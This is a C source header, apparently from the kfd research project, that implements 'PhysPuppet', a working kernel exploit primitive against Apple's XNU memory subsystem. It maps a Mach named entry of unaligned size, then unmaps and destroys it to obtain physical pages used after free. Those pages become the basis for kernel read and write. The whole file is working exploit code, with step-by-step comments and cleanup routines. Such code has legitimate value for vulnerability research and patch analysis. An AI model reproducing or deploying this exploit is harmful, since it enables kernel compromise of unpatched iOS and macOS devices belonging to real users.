/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef physpuppet_h
#define physpuppet_h

const u64 PHYSPUPPET_VMNE_SIZE = pages(2) + 1;
const u64 PHYSPUPPET_VME_OFFSET = pages(1);
const u64 PHYSPUPPET_VME_SIZE = pages(2);

void physpuppet_init(struct kfd* kfd)
{
	// Nothing to initialize
}

void physpuppet_run(struct kfd* kfd)
{
	for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
		// STEP 1: Create a vm_named_entry
		mach_port_t named_entry = MACH_PORT_NULL;
		assert_mach(mach_memory_object_memory_entry_64(
			mach_host_self(), true, PHYSPUPPET_VMNE_SIZE, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry
		));

		// STEP 2: Map vm_named_entry into vm_map
		vm_address_t address = 0;
		assert_mach(vm_map(
			mach_task_self(), &address, -1, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry,
			PHYSPUPPET_VME_OFFSET, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT
		));

		// STEP 3: Fault in pages to set permissions
		memset((void*)address, 'A', PHYSPUPPET_VME_SIZE);

		// STEP 4: Unmap the address range
		assert_mach(vm_deallocate(mach_task_self(), address, PHYSPUPPET_VME_SIZE));

		// STEP 5: Destroy the vm_named_entry
		assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
		kfd->puaf.puaf_pages_uaddr[i] = address + PHYSPUPPET_VME_OFFSET;

		// STEP 6: Reinsert vm_map_entry and fault in the first page
		assert_mach(vm_allocate(mach_task_self(), &address, PHYSPUPPET_VME_SIZE, VM_FLAGS_FIXED));
		memset((void*)address, 'A', PHYSPUPPET_VME_OFFSET);
	}
}

void physpuppet_cleanup(struct kfd* kfd)
{
	u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
	u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

	for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
		u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
		if (puaf_page_uaddr != kread_page_uaddr && puaf_page_uaddr != kwrite_page_uaddr) {
			assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - PHYSPUPPET_VME_OFFSET, PHYSPUPPET_VME_SIZE));
		}
	}
}

void physpuppet_free(struct kfd* kfd)
{
	u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
	u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

	assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - PHYSPUPPET_VME_OFFSET, PHYSPUPPET_VME_SIZE));
	if (kwrite_page_uaddr != kread_page_uaddr) {
		assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - PHYSPUPPET_VME_OFFSET, PHYSPUPPET_VME_SIZE));
	}
}

#endif /* physpuppet_h */